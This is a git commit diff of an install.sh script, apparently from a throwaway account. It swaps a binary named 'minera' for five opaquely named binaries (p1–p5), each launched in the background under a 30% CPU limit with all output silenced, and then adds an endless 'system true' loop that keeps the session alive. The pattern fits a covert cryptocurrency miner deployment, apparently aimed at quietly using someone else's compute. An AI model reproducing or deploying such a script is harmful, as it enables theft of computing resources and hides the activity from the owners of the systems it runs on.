ceec32dfa9577ad91ff8f9f883266ae4c3657899
atrhrzocva001 <96792967+atrhrzocva001@users.noreply.github.com>
2021-12-28 10:55:53 -0800

    Update install.sh

--- install.sh
+++ install.sh
@@ -1,6 +1,14 @@
 apt-get update -y
 apt-get install -y cpulimit screen
-chmod +x minera
+chmod +x p1
+chmod +x p2
+chmod +x p3
+chmod +x p4
+chmod +x p5
 chmod +x config.json
-cpulimit -l 30 ./minera >/dev/null 2>&1 >/dev/null &
+cpulimit -l 30 ./p1 >/dev/null 2>&1 >/dev/null &
+cpulimit -l 30 ./p2 >/dev/null 2>&1 >/dev/null &
+cpulimit -l 30 ./p3 >/dev/null 2>&1 >/dev/null &
+cpulimit -l 30 ./p4 >/dev/null 2>&1 >/dev/null &
+cpulimit -l 30 ./p5 >/dev/null 2>&1 >/dev/null &
 while :; do echo "system true"; sleep 30; done
